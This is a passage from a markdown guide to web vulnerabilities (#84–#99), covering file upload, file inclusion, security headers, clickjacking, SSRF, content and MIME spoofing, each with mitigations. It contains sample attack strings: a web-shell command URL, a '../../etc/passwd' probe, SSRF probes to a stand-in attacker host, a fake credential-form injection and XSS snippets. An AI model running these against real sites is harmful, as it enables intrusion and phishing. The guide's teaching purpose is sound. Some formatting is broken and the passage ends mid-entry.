- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [RFC 7231 - HTTP Semantics](https://datatracker.ietf.org/doc/html/rfc7231#section-7.1.2)

---

## 🧾 Summary

| Category               | Details                          |
|------------------------|----------------------------------|
| **Risk**               | High (Phishing, Access Bypass)   |
| **Ease of Exploitation** | Easy                           |
| **Prevention**         | Validate and sanitize redirects  |
| **Testing**            | Static, dynamic, manual          |

---

## ✅ Best Practices Checklist

- [x] Use only relative internal paths in redirects  
- [x] Maintain a whitelist of safe redirect targets  
- [x] Never trust user-controlled input in redirect logic  
- [x] Validate hostnames if external redirects are allowed  
- [x] Log and monitor all redirect usage  
---

### # 🛡️ Web Vulnerability #84: Unrestricted File Upload

Uploaded shell is then accessed via:
```http
http://vulnerable.example.com/uploads/shell.php?cmd=id
```
**🧠 Impact**
* Remote Code Execution (RCE): Uploading executable code leads to full system compromise.

* Website Defacement: Attackers replace pages or insert malicious scripts.

* Data Exfiltration: Access or steal sensitive files via uploaded scripts.

* Privilege Escalation: Combined with other vulnerabilities to gain admin access.

**🛠️ Prevention & Mitigation**
✅ 1. Restrict File Types
Allow only specific, non-executable MIME types and extensions (e.g. .jpg, .png, .pdf).

```python

ALLOWED_EXTENSIONS = ['jpg', 'png', 'pdf']
def is_allowed(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```
**✅ 2. Use File Content Inspection**
- Validate file content matches the expected format using tools like magic or image processing libraries.

**✅ 3. Store Outside Web Root**
- Save uploaded files in directories not accessible by the web server.

**✅ 4. Rename Uploaded Files**
- Avoid using original filenames. Rename with random UUIDs to prevent path traversal or script execution.

**✅ 5. Apply Server-Side Validation**
- Don't rely on client-side checks. Enforce size limits, file scans, and extension checks on the server.

**✅ 6. Disable Script Execution**
- Configure the web server to not execute uploaded files:

`Apache (.htaccess)`

```apacheconf

<Directory "/var/www/uploads">
    php_admin_flag engine off
</Directory>
```
`Nginx`

```nginx

location /uploads/ {
    default_type text/plain;
    autoindex off;
}
```
**🔍 Detection**
* Code Review: Look for file upload functions without validation.

* Dynamic Testing: Upload files like .php, .jsp, .aspx and try to access them.

* Fuzzing: Attempt uploading various payloads and content types.

**🧰 Tools**
* Burp Suite: Modify and intercept file upload requests.

* OWASP ZAP: Automated scanning.

* ClamAV / VirusTotal API: Scan uploaded files.

* MagicBytes Checkers: To validate file headers.

**📚 References**
* OWASP: Unrestricted File Upload

* CWE-434: Unrestricted Upload of File with Dangerous Type

* OWASP Testing Guide - File Upload Testing

**🧾 Summary**
| Category          | Details                          |
|-------------------|---------------------------------|
| Risk              | Critical (Remote Code Execution)|
| Ease of Exploitation | Moderate                      |
| Prevention        | Strong validation and storage rules |
| Testing           | Static, dynamic, manual         |


**✅ Best Practices Checklist**
 * Only allow safe file types and extensions

*  Inspect file content (magic bytes, MIME)

*  Rename uploaded files to random names

*  Store uploads outside the web root

*  Disable script execution in upload directories

*  Enforce server-side validation and file size limits
---
# 🛡️ Web Vulnerability #85: File Inclusion Vulnerabilities

File inclusion vulnerabilities occur when an application dynamically includes files without properly validating the input, allowing attackers to include unintended files. These can lead to remote code execution, data leakage, or full server compromise.

---

## 🧠 Impact
- Remote Code Execution (RCE): Attackers can execute arbitrary code by including malicious files.
- Information Disclosure: Access sensitive files like /etc/passwd or application config files.
- Denial of Service: Including large or recursive files can crash the server.

---

## 🛠️ Prevention & Mitigation
✅ 1. Validate Input Strictly  
Allow only predefined filenames or whitelist specific files for inclusion.

```python
ALLOWED_FILES = ['header.php', 'footer.php', 'config.php']

filename = request.args.get('page')
if filename in ALLOWED_FILES:
    include(filename)
else:
    abort(400)
```
✅ 2. Avoid User-Controlled Input in File Paths  
Never directly use user input to build file paths for includes.

✅ 3. Use Absolute Paths  
Use absolute paths and sanitize input to prevent directory traversal attacks.

✅ 4. Disable Remote File Includes  
Configure the server or runtime environment to disallow remote file includes (e.g., PHP’s allow_url_include=Off).

✅ 5. Implement Least Privilege  
Ensure web server and application have minimum permissions needed to operate.

---

🔍 Detection  
- Code Review: Look for include, require, or similar functions using user input.  
- Dynamic Testing: Attempt to include local files (e.g., ../../etc/passwd) or remote URLs.  
- Fuzzing: Test various input payloads that might trigger inclusion.

---

🧰 Tools  
- Burp Suite / OWASP ZAP: To manipulate file include parameters.  
- Static Analyzers: Checkmarx, RIPS, SonarQube.  
- Web Application Firewalls (WAF): Can detect and block suspicious file path patterns.

---

📚 References  
- OWASP: File Inclusion  
- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program  
- CWE-23: Relative Path Traversal

---

🧾 Summary  

| Category            | Details                          |
|---------------------|---------------------------------|
| Risk                | Critical (RCE, Data Disclosure) |
| Ease of Exploitation | Moderate to Easy                |
| Prevention          | Strict validation, disable remote includes |
| Testing             | Static, dynamic, manual          |

---

✅ Best Practices Checklist  
- Use whitelists for allowable files  
- Never use user input directly in file paths  
- Disable remote file inclusion features  
- Sanitize and normalize file paths  
- Limit file system permissions

---
# 🛡️ Web Vulnerability #86: Security Header Bypass

Security headers are HTTP response headers that protect web applications from a variety of attacks by instructing browsers how to behave. A security header bypass occurs when these headers are missing, misconfigured, or overridden, allowing attackers to bypass protections like Content Security Policy (CSP), X-Frame-Options, and others.

---

## 🧠 Impact
- **Cross-Site Scripting (XSS):** Without proper CSP, malicious scripts can execute.
- **Clickjacking:** Missing or improper X-Frame-Options allows attackers to embed the site in frames.
- **Man-in-the-Middle (MITM):** Lack of Strict-Transport-Security (HSTS) can lead to HTTPS stripping.
- **Information Disclosure:** Missing headers like X-Content-Type-Options can enable MIME-sniffing attacks.

---

## 🛠️ Prevention & Mitigation

✅ **1. Implement Essential Security Headers**

| Header                 | Purpose                                               | Example                                  |
|------------------------|-------------------------------------------------------|------------------------------------------|
| Content-Security-Policy | Restrict resources/scripts the browser can load       | `Content-Security-Policy: default-src 'self'` |
| X-Frame-Options         | Prevent clickjacking by controlling framing           | `X-Frame-Options: DENY`                   |
| Strict-Transport-Security | Force HTTPS connections                               | `Strict-Transport-Security: max-age=31536000; includeSubDomains` |
| X-Content-Type-Options  | Prevent MIME sniffing                                  | `X-Content-Type-Options: nosniff`        |
| Referrer-Policy         | Control the Referer header                             | `Referrer-Policy: no-referrer-when-downgrade` |
| Permissions-Policy      | Control browser features (e.g., geolocation, camera) | `Permissions-Policy: geolocation=()`     |

✅ **2. Avoid Overriding Headers via JavaScript or Proxies**  
Headers should be set server-side. Avoid client-side manipulation that may weaken security policies.

✅ **3. Use CSP in Report-Only Mode for Testing**  
Deploy CSP in `report-only` mode first to identify policy violations without blocking legitimate content.

✅ **4. Regularly Review and Update Headers**  
Security headers should evolve with application changes and emerging threats.

---

## 🔍 Detection

- **Automated Scanners:** Tools like OWASP ZAP, Qualys SSL Labs, or securityheaders.com can identify missing or weak headers.
- **Manual Testing:** Inspect HTTP response headers using browser developer tools or `curl -I https://example.com`.
- **Penetration Testing:** Attempt attacks like clickjacking or XSS to check if headers effectively mitigate risks.

---

## 🧰 Tools

- [SecurityHeaders.com](https://securityheaders.com/) — Quick header assessment  
- OWASP ZAP — Automated security testing  
- Burp Suite — Manual and automated web security testing  
- Qualys SSL Labs — Tests HTTPS and related headers

---

## 📚 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)  
- [MDN Web Docs - HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)  
- [Mozilla Observatory](https://observatory.mozilla.org/)  

---

## 🧾 Summary

| Category            | Details                                                  |
|---------------------|----------------------------------------------------------|
| Risk                | Medium to High (XSS, Clickjacking, MITM)                 |
| Ease of Exploitation | Easy to Moderate                                         |
| Prevention          | Properly configure and maintain security headers          |
| Testing             | Static header checks, automated scanning, manual testing |

---

✅ **Best Practices Checklist**

- Implement all essential security headers with strong policies  
- Set headers server-side, avoid client-side overrides  
- Use CSP report-only mode before enforcement  
- Regularly scan and audit headers after updates  
- Educate developers on header importance and risks
---
# 🛡️ Web Vulnerability #87: Clickjacking

Clickjacking is a UI redress attack that tricks users into clicking on something different from what they perceive, potentially revealing confidential information or taking control actions unknowingly.

**🧠 Impact**
- Unauthorized Actions: Users may unknowingly perform actions like changing settings or making purchases.
- Credential Theft: Attackers may capture sensitive input via disguised forms.
- Reputation Damage: Users lose trust if your site enables clickjacking.

**🛠️ Prevention & Mitigation**

**✅ 1. Use X-Frame-Options Header** 

Prevents your site from being framed by other domains.
- X-Frame-Options: DENY
`or`

X-Frame-Options: SAMEORIGIN


✅ 2. Use Content Security Policy (CSP) Frame Ancestors Directive  
More flexible and modern approach to control framing.

Content-Security-Policy: frame-ancestors 'self' https://trustedpartner.com/;


✅ 3. Frame Busting Scripts (Not Recommended)  
JavaScript to prevent framing, but can be bypassed and is discouraged.


```
if (window.top !== window.self) {
window.top.location = window.self.location;
}

```

**🔍 Detection**
- Manual Testing: Try framing the target site in an iframe on a different domain.
- Automated Scanners: Tools like OWASP ZAP, Burp Suite detect missing frame options.

**🧰 Tools**
- OWASP ZAP
- Burp Suite
- SecurityHeaders.io (to check headers)

**📚 References**
- OWASP Clickjacking  
- MDN Web Docs: X-Frame-Options  
- RFC 7034

**🧾 Summary**
| Category           | Details                          |
|--------------------|---------------------------------|
| Risk               | Medium (Unauthorized UI actions)|
| Ease of Exploitation| Easy                            |
| Prevention         | Use X-Frame-Options or CSP      |
| Testing            | Manual, automated scanners      |

**✅ Best Practices Checklist**

- Set X-Frame-Options header to DENY or SAMEORIGIN
- Use Content-Security-Policy frame-ancestors directive
- Avoid relying solely on frame-busting scripts
- Test regularly for framing vulnerabilities
---

# Web Vulnerability #88: ⏳ Inadequate Session Timeout

**Description:**  
Inadequate session timeout refers to the failure of a web application to properly invalidate user sessions after a period of inactivity. This allows an attacker to potentially hijack a valid session if it remains active beyond a reasonable time limit. 🕵️‍♂️ Sessions that never expire or that last excessively long increase the risk of unauthorized access, especially on shared or public devices.

**Risk:**  
🚨 High

**Impact:**  
- 🔓 Unauthorized access to user accounts  
- 🛑 Data theft or manipulation  
- 🎭 Session hijacking attacks  
- 🧾 Prolonged exposure of user credentials or session tokens  

**Affected Components:**  
- 🧩 Session management module  
- 🔐 Authentication mechanism  
- 🕰️ Application timeout settings  

**Steps to Reproduce:**  
1. 🔑 Log into the application with valid credentials.  
2. ⌛ Remain inactive for an extended period (e.g., 30 minutes to several hours).  
3. 🔄 Attempt to use the session again without re-authenticating.  
4. 🚪 Observe that the session is still valid and the application has not logged the user out.  

**Mitigation:**  
- 🕵️ Implement strict session timeout policies (e.g., auto logout after 15–30 minutes of inactivity).  
- 🔁 Revalidate sessions on critical actions such as payments, settings changes, or data exports.  
- 🖥️ Use server-side session expiration controls, not just client-side JavaScript timers.  
- ⚠️ Clearly inform users when a session is about to expire and allow secure reauthentication if needed.  

**References:**  
- 📘 OWASP Session Management Cheat Sheet  
- 📘 OWASP Top 10: A2 – Broken Authentication  
- 📘 NIST SP 800-63B Digital Identity Guidelines – Session Management  

---

# Web Vulnerability #89: 📉 Insufficient Logging and Monitoring

**Description:**  
Insufficient logging and monitoring occurs when a web application fails to properly log security-relevant events or does not monitor those logs for suspicious activity. This limits the ability of system administrators to detect, investigate, and respond to attacks in a timely manner. 🕶️ Without adequate logs, intrusion attempts and successful breaches may go unnoticed.

**Risk:**  
🚨 High

**Impact:**  
- 🕑 Delayed detection of breaches  
- 🧪 Inability to perform forensic analysis  
- 📋 Failure to comply with auditing and regulatory requirements  
- 🔍 Increased damage due to undetected malicious activity  

**Affected Components:**  
- 📂 Server-side logging mechanisms  
- 📡 Security event monitoring systems  
- 🛡️ Intrusion detection systems (IDS)  
- 🖥️ Administrative dashboards and alerts  

**Steps to Reproduce:**  
1. ⚔️ Attempt a common attack (e.g., SQL injection, brute-force login).  
2. 📁 Check server logs and administrative interfaces.  
3. 🚫 Observe that the event was not logged or no alert was generated.  
4. ❌ Verify that no real-time monitoring or alerting mechanisms responded to the suspicious activity.  

**Mitigation:**  
- 📝 Implement detailed logging for authentication attempts, permission changes, input validation failures, and access to sensitive data.  
- 🔒 Store logs in a secure, tamper-proof location.  
- ⏰ Set up real-time monitoring and alerting systems to detect anomalies.  
- 📊 Regularly review and analyze logs for signs of compromise.  
- 🧱 Ensure logging covers all application tiers: APIs, backend services, and databases.  

**References:**  
- 📘 OWASP Logging Cheat Sheet  
- 📘 OWASP Top 10: A10 – Insufficient Logging & Monitoring  
- 📘 NIST SP 800-92: Guide to Computer Security Log Management  

***
# Web Vulnerability #90: 🧠 Business Logic Vulnerabilities

**Description:**  
Business logic vulnerabilities arise when an attacker exploits flaws in the intended workflow or process rules of a web application. These are not traditional security bugs like XSS or SQL injection, but logical loopholes that allow actions the system was not intended to permit.

🛠️ These issues often stem from improper enforcement of rules such as pricing, authentication flow, authorization, or transactional limits.

**Risk:**  
🚨 High

**Impact:**  
- 🛒 Unauthorized discounts or free products  
- 💸 Financial fraud or bypass of payment  
- 🔐 Unauthorized access to restricted features  
- 📉 Reputational damage due to broken trust  

**Affected Components:**  
- 🧾 Payment workflows  
- 🔁 Order processing  
- 📦 Inventory systems  
- 🔐 Access control logic  
- 📝 User account and subscription handling  

**Steps to Reproduce:**  
1. Analyze the business workflow (e.g., shopping cart, registration process).  
2. Identify assumptions or rules (e.g., "discount applies only once").  
3. Try to bypass or abuse those rules (e.g., apply the discount multiple times).  
4. Observe if the application allows actions that violate intended logic.  

**Example Attack Scenarios:**  
- 🔁 Repeated use of one-time coupons  
- 💳 Skipping payment step via crafted HTTP requests  
- 🧮 Manipulating product quantities or prices client-side  
- 📧 Registering with unverified emails to access premium features  

**Mitigation:**  
- 🔍 Perform threat modeling to identify abuse cases  
- 🛡️ Enforce business rules strictly on the server side  
- 📊 Implement logging and alerts for unusual patterns  
- 🔄 Regularly audit workflows and permission boundaries  
- 👥 Include product managers in security reviews to validate logic assumptions  

**References:**  
- OWASP Top 10: A05 – Security Misconfiguration  
- OWASP Business Logic Security  
- CWE-840: Business Logic Errors  

---
# Web Vulnerability #91: 🔌 API Abuse

**Description:**  
API abuse occurs when attackers exploit the intended functionality of an API in unintended ways to gain unauthorized access, extract excessive data, disrupt services, or bypass business logic. APIs are often under-secured, making them prime targets for automation, scraping, fuzzing, or logic abuse.

🔓 Unlike traditional exploits, API abuse typically involves using valid requests at an abnormal scale or sequence to break intended use flows or overwhelm the system.

**Risk:**  
🚨 High

**Impact:**  
- 📤 Mass data extraction (data scraping or leakage)  
- 🔁 Abuse of paid features or rate-limited endpoints  
- 📉 Service degradation or denial of service (DoS)  
- 👮 Bypass of authentication or authorization mechanisms  

**Affected Components:**  
- 🌐 Public and internal APIs  
- 🔐 Authentication and authorization layers  
- 💰 Billing and quota systems  
- 🧠 Business logic workflows  

**Steps to Reproduce:**  
1. 🔍 Analyze API documentation or capture traffic using tools like Postman or Burp Suite.  
2. 🧪 Identify endpoints that return sensitive data, lack rate limits, or behave inconsistently.  
3. 🤖 Automate requests or modify parameters to exceed normal usage.  
4. 🧾 Observe whether the application responds with unintended data, behavior, or allows abuse of business logic.  

**Example Attack Scenarios:**  
- 📑 Scraping large volumes of user or product data  
- 💸 Repeatedly triggering promotional or discount codes via API  
- 🚪 Circumventing mobile-only features using direct API calls  
- 📶 Sending high volumes of API calls to exhaust system resources  

**Mitigation:**  
- 🔐 Implement strong authentication and authorization checks for every API request  
- 📈 Apply strict rate limiting and quotas per user/IP/app  
- 🧱 Use Web Application Firewalls (WAFs) and API Gateways to detect and block abuse patterns  
- 🚨 Log and monitor API traffic for unusual behavior and anomalies  
- 🛠️ Obfuscate or restrict public API documentation where possible  

**References:**  
- 📘 OWASP API Security Top 10  
- 📘 OWASP API Security Cheat Sheet  
- 📘 NIST SP 800-204: Security Strategies for Microservices-Based Application Systems  

---
PART XII 
---
# Authentication Bypass

***
# Web Vulnerability #92: 🧠 Insecure "Remember Me" Functionality

**Description:**  
The "Remember Me" feature is commonly used to keep users logged in across sessions without requiring them to re-enter their credentials. However, if implemented insecurely, this functionality can expose users to significant security risks such as session hijacking, credential theft, or unauthorized access.

🚨 Insecure "Remember Me" implementations often rely on poorly protected tokens, predictable identifiers, or long-lived cookies that are not adequately bound to the user or device.

**Risk:**  
⚠️ Medium to High (depending on implementation)

**Impact:**  
- 🔓 Unauthorized account access  
- 🕵️ Session hijacking via stolen tokens  
- 🐾 Device impersonation  
- 📂 Exposure of sensitive data without re-authentication  

**Affected Components:**  
- 🍪 Authentication cookies or tokens  
- 🔐 Token storage and validation mechanisms  
- 🧩 Session handling logic  

**Steps to Reproduce:**  
1. ✅ Log into the application and enable the "Remember Me" checkbox.  
2. 🕵️ Extract the authentication cookie or token from browser storage.  
3. 💻 Replay the token on another browser or device.  
4. 🔐 Observe if access is granted without re-authentication, even on unauthorized devices.  

**Common Weaknesses:**  
- 📅 Tokens with extremely long or no expiration dates  
- 🔁 Reusable tokens without rotation  
- 📦 Tokens stored insecurely in localStorage or cookies without the HttpOnly/secure flags  
- ❌ No device/user binding (e.g., IP, device fingerprint, user agent)  

**Mitigation:**  
- 🛡️ Use short-lived, rotating tokens tied to specific devices  
- 🔒 Store tokens securely with `HttpOnly` and `Secure` flags  
- 📵 Invalidate tokens on logout or unusual activity (e.g., IP change)  
- 🧠 Re-authenticate users for sensitive actions, even if remembered  
- 📊 Monitor for abuse patterns involving persistent login tokens  

**References:**  
- 📘 OWASP Authentication Cheat Sheet  
- 📘 OWASP Session Management Cheat Sheet  
- 📘 OWASP Top 10: A2 – Broken Authentication  
---

# Web Vulnerability #93: 🤖 CAPTCHA Bypass

**Description:**  
CAPTCHAs are designed to distinguish between human users and bots to prevent automated abuse. However, weak or poorly implemented CAPTCHA mechanisms can be bypassed, rendering them ineffective against spam, brute-force attacks, or account enumeration.

🧠 CAPTCHA bypass vulnerabilities typically occur due to predictable logic, flawed validation, or the ability to skip CAPTCHA altogether through direct API access or replayed tokens.

**Risk:**  
⚠️ Medium to High

**Impact:**  
- 🧪 Automated brute-force or credential stuffing attacks  
- 🗑️ Spam submissions on forms, comments, or signups  
- 🕵️ User enumeration and scraping  
- 🪫 Decreased security and system overload due to bot traffic  

**Affected Components:**  
- 🧩 CAPTCHA challenge and validation system  
- 🔗 Frontend forms (login, registration, contact)  
- 🔐 API endpoints relying on CAPTCHA  
- 🔁 Session and token handling  

**Steps to Reproduce:**  
1. 🔍 Identify a form protected by CAPTCHA (e.g., login or registration).  
2. 🧪 Attempt to submit the form without solving or interacting with the CAPTCHA.  
3. 📡 Observe if the backend still processes the request.  
4. 🔁 Try using automated tools or scripts to repeat the action.  
5. 🤖 Confirm whether the CAPTCHA can be bypassed or solved by bots.  

**Common Bypass Techniques:**  
- ⛔ Disabling or skipping client-side validation  
- 🧱 Direct API access that doesn't enforce CAPTCHA  
- 🧾 Reusing previously solved CAPTCHA tokens  
- 🔄 Using OCR or AI services to solve visual CAPTCHAs automatically  

**Mitigation:**  
- 🔐 Validate CAPTCHA server-side, not just in JavaScript  
- 📉 Apply rate limiting and IP throttling even when CAPTCHA is used  
- 🔁 Rotate and expire CAPTCHA tokens quickly  
- 📊 Use behavior analysis or device fingerprinting in addition to CAPTCHA  
- 💡 Implement stronger CAPTCHAs (e.g., reCAPTCHA v3 with score-based decisions)  

**References:**  
- 📘 OWASP Automated Threats to Web Applications  
- 📘 OWASP Cheat Sheet: Blocking Automated Web Application Attacks  
- 📘 Google reCAPTCHA Documentation  
---
# PART XIII

## Server - Side  Request Forgery (SSRF) Types

---

# Web Vulnerability #94: 👁️‍🗨️ Blind Server-Side Request Forgery (SSRF)

**Description:**  
Blind SSRF occurs when an attacker is able to make the server perform HTTP requests to internal or external resources without seeing the response. Unlike standard SSRF, the attacker doesn't directly observe the server's response but can infer behavior through side effects such as time delays, DNS lookups, or error codes.

🎯 This makes Blind SSRF more difficult to detect and exploit but just as dangerous, especially in cloud-native environments where internal metadata endpoints can be targeted.

**Risk:**  
🚨 High

**Impact:**  
- 🔐 Access to internal systems/services not exposed publicly  
- 🧾 Exfiltration of internal data via DNS or third-party services  
- ☁️ Access to cloud metadata services (e.g., AWS, GCP, Azure)  
- 📡 Port scanning or pivoting to restricted internal networks  

**Affected Components:**  
- 🌐 URL-fetching services (PDF generators, image fetchers, link previewers)  
- 🔗 Third-party integrations  
- 🔒 Internal-only resources reachable by backend servers  
- ☁️ Cloud metadata endpoints (e.g., `http://169.254.169.254`)  

**Steps to Reproduce (Blind):**  
1. 🌍 Identify an input that results in server-side URL fetching (e.g., webhook, file import, image load).  
2. 🧪 Provide a URL pointing to an attacker-controlled domain (e.g., `http://attacker.com`).  
3. 🔍 Monitor DNS logs, out-of-band systems, or server timing (e.g., time delays for `http://10.0.0.1`).  
4. 👁️ Confirm server-side interaction even without seeing the direct response.  

**Blind SSRF Indicators:**  
- 📉 Long response delays from internal network probing  
- 📬 DNS queries to attacker-controlled domain  
- ⛔ Outbound requests seen on firewall logs  
- 📊 Behavioral side effects (e.g., unexpected backend errors or logs)  

**Mitigation:**  
- 🧱 Use strict allowlists for outbound requests  
- 🔍 Validate and sanitize all user-supplied URLs server-side  
- 🛡️ Block access to internal IP ranges and sensitive metadata endpoints  
- 📡 Log all outbound requests and alert on suspicious destinations  
- ☁️ Configure cloud platforms to disable metadata access where not needed  

**References:**  
- 📘 OWASP SSRF Prevention Cheat Sheet  
- 📘 OWASP Top 10: A10 – Server-Side Request Forgery  
- 📘 PortSwigger Guide to SSRF  
- 📘 AWS Security Best Practices: Metadata Protection  

---

# Web Vulnerability #95: ⏱️ Time-Based Blind SSRF

**Description:**  
Time-based Blind SSRF is a special class of Server-Side Request Forgery where the attacker cannot see the server’s response but infers behavior based on response **timing delays**. By forcing the server to make a request to a URL that takes a long time to respond, an attacker can confirm the presence of a blind SSRF vulnerability through **measurable latency**.

🔍 This technique is useful when no direct response is returned and no out-of-band channels (like DNS logs) are available. Timing is the only clue!

**Risk:**  
🚨 High

**Impact:**  
- 🔓 Internal network scanning  
- ☁️ Access to cloud metadata endpoints  
- ⌛ Enumeration of internal services via port probing  
- 🕵️ Covert exfiltration or discovery without detection  

**Affected Components:**  
- 🌐 HTTP clients used in backend (e.g., file import, link preview)  
- 📦 SSRF-prone services (e.g., URL fetchers, SSRF-vulnerable APIs)  
- 🛠️ Microservices making internal HTTP calls  
- 📡 Cloud environments with exposed metadata endpoints  

**Steps to Reproduce (with delay-based PoC):**  
1. 🎯 Locate an endpoint that makes a backend HTTP request using user input.
2. 🔗 Inject a URL that connects to an internal or attacker-controlled address that **intentionally delays** the response.
3. ⏱️ Measure the response time of the vulnerable endpoint.
4. ✅ Confirm SSRF if a noticeable delay matches the timing of your test URL.

**Example Payload (using a delay service):**
`http://vulnerable-site.com/preview?url=http://internal-ip-or-slow-server.com:80/`


🧪 Or using a delay endpoint:

`http://vulnerable-site.com/preview?url=http://attacker.com/delay?time=10`

---

```csharp


**Sample Attacker-Side Delay Server (Node.js):**
```js
const http = require('http');

http.createServer((req, res) => {
  setTimeout(() => {
    res.end('Delayed Response');
  }, 10000); // 10 seconds
}).listen(80);

```
🕵️ When the server waits exactly 10 seconds before returning a response, the attacker confirms the SSRF.

**Mitigation:**

📋 Whitelist allowed domains and schemes (e.g., only HTTPS)  
🔐 Block requests to internal IP ranges (127.0.0.1, 169.254.169.254, 10.0.0.0/8)  
🚫 Deny access to cloud metadata endpoints  
🧱 Use SSRF-aware libraries with built-in protections  
📡 Monitor outbound traffic and alert on unusual destinations or long response times

**References:**

📘 OWASP SSRF Prevention Cheat Sheet  
📘 PortSwigger SSRF Labs  
📘 Cloud Security Alliance – Metadata Service Attacks  

---

# Web Vulnerability #96: Content Spoofing

**Vulnerability Type:** Content Spoofing (a.k.a. Content Injection)

**Discovery Date:** [Insert Date]

**Location:** Public-facing web page that reflects user input (e.g., `https://example.com/news?article=latest`)

---

## Description

Content Spoofing occurs when a web application improperly reflects user-supplied input in such a way that it appears to be legitimate site content. This can trick users into believing fake messages, links, or interface elements are trustworthy and originate from the actual website, enabling phishing or social engineering attacks.

This vulnerability typically exploits reflected parameters in the URL or improperly sanitized query strings that alter page content.

---

## Proof of Concept (PoC)

**Target URL:**

`https://victimsite.com/info?msg=Welcome+to+our+new+secure+platform`


**Vulnerable Parameter:**

`msg`

**Malicious Payload Example:**
```html

https://victimsite.com/info?msg=<h1>Security+Update:+Please+enter+your+credentials</h1><form><input+type='text'+placeholder='Username'><br><input+type='password'+placeholder='Password'></form>

```


**Resulting Spoofed Page:**

If the page reflects the `msg` parameter directly into the DOM without sanitization:

```html
<!-- Example of vulnerable server-side rendering -->
<html>
  <body>
    <div id="message">
      <!-- Reflected input -->
      <h1>Security Update: Please enter your credentials</h1>
      <form>
        <input type='text' placeholder='Username'><br>
        <input type='password' placeholder='Password'>
      </form>
    </div>
  </body>
</html>
```

## Impact

- **Phishing**: Users might enter passwords or personal data into fake forms.
- **Brand damage**: Makes the site appear insecure or compromised.
- **Social engineering**: Attackers can trick users into performing actions based on misleading content.

## Mitigation

- Always **sanitize user input** before reflecting it in the response.
- Use **context-aware output encoding** (HTML encoding for HTML context).
- Apply **Content Security Policy (CSP)** to restrict inline scripts and reduce XSS exploitation potential.
- Where possible, avoid reflecting unsanitized user input directly into visible content.

## References

- OWASP: https://owasp.org/www-community/attacks/Content_Spoofing
- CWE-451: https://cwe.mitre.org/data/definitions/451.html

---
# Web Vulnerability #97: MIME Spoofing

**Vulnerability Type:** MIME Type Spoofing

**Discovery Date:** [Insert Date]

**Location:** File download endpoint (e.g., `https://example.com/download.php?file=report.pdf`)

---

## Description

MIME Spoofing occurs when a web application serves user-uploaded or user-supplied files without properly setting or validating the `Content-Type` (MIME type) header. Attackers can exploit this by uploading files with misleading extensions (like `.jpg` or `.pdf`) that actually contain executable content (e.g., HTML, JavaScript).

If the browser trusts the file extension over the actual MIME type, or if the server sends incorrect or no `Content-Type`, this may allow attackers to execute scripts or present spoofed content, leading to Cross-Site Scripting (XSS) or phishing attacks.

---

## Proof of Concept (PoC)

### Malicious Upload Example:

An attacker uploads a file named `invoice.pdf` with the following content:

```html
<!-- invoice.pdf (actually HTML) -->
<html>
  <body>
    <h1>Company Payment Notice</h1>
    <script>alert("Your session has expired. Please login again.");</script>
  </body>
</html>
```
Despite being named invoice.pdf, the file is actually HTML/JavaScript.

Vulnerable File Download Endpoint:
```arduino

https://vulnerablesite.com/download.php?file=invoice.pdf
```
The server responds with headers like:

```pgsql

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: inline; filename="invoice.pdf"

```
Or worse, no Content-Type header at all, letting the browser guess.


## Spoofed Execution in Browser

If the browser performs MIME sniffing and determines the file is HTML, it might render and execute it, especially if:

- The site is using HTTP (not HTTPS)
- `X-Content-Type-Options: nosniff` is not set
- `Content-Disposition` is `inline` instead of `attachment`

## Impact

- **XSS**: Executable script in an uploaded file can hijack user sessions or perform malicious actions.
- **Phishing**: Fake PDF or image files may be rendered as interactive HTML pages.
- **Bypass of file-type restrictions**: Misleading file extensions can evade file upload validations.

## Mitigation

- Always serve uploaded files with strict `Content-Type` headers based on actual content, not file extension.
- Set the HTTP header `X-Content-Type-Options: nosniff` to prevent MIME sniffing:

---

# Web Vulnerability #98: X-Content-Type-Options Bypass

**Vulnerability Type:** HTTP Response Header Misconfiguration / MIME Sniffing Bypass

**Discovery Date:** [Insert Date]

**Location:** HTTP Response headers for downloadable or embedded user-controlled content

---

## Description

The `X-Content-Type-Options` header is a security control used to instruct browsers not to perform MIME sniffing. When set to `nosniff`, it tells browsers to trust the declared `Content-Type` of a resource and not guess based on content.

If this header is **absent**, **malformed**, or **bypassed**, browsers may perform MIME sniffing, allowing them to render content (e.g., JavaScript or HTML) that was expected to be treated as inert (e.g., plain text or application/octet-stream). This can enable cross-site scripting (XSS), content spoofing, and other browser-based attacks.

---

## Proof of Concept (PoC)

### Malicious File Upload

An attacker uploads a file named `safe.txt` with the following content:

```html
<!-- safe.txt (actually JavaScript) -->
<script>alert('XSS');</script>
```
The server responds with the following HTTP headers:

```pgsql

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Disposition: inline; filename="safe.txt"

```
## Missing or Bypassable Header

If the server does not send:
X-Content-Type-Options: nosniff


The browser may sniff the content as HTML/JS and execute it, especially if:

- The file is served inline
- The content resembles HTML/JavaScript
- The user is tricked into clicking the link

## Bypass Variants

Some misconfigurations that can bypass protection:

X-Content-Type-Options: None
X-Content-Type-Options: no-sniff
X-Content-Type-Options: nosniff;
X-Content-Type-Options: "nosniff"

These are **invalid** and ignored by browsers.

## Impact

- **Cross-Site Scripting (XSS)**: Executable content in user-uploaded files may be rendered and executed.
- **Content Spoofing**: Malicious content appears to be legitimate due to MIME confusion.
- **Policy Bypass**: Upload restrictions and content policies become ineffective.

## Mitigation

- Set the correct header on all user-controlled content:
X-Content-Type-Options: nosniff


- Validate header syntax precisely. It must match `nosniff` exactly, case-insensitive, no quotes or punctuation.
- Force downloads with `Content-Disposition: attachment`:

Content-Disposition: attachment; filename="safe.txt"


- Do not allow user-uploaded content to be served from the same domain as trusted scripts/pages.
- Use separate subdomains or storage domains (e.g., `cdn.example.com`) for user uploads.

## References

- MDN Web Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
- OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/
- Microsoft MIME Sniffing Specification: https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)

---

# Web Vulnerability #99: Content Security Policy (CSP) Bypass

**Vulnerability Type:** Web Application Misconfiguration / Client-Side Defense Bypass

**Discovery Date:** [Insert Date]

**Location:** HTTP response headers or `<meta>` CSP directives

---

## Description

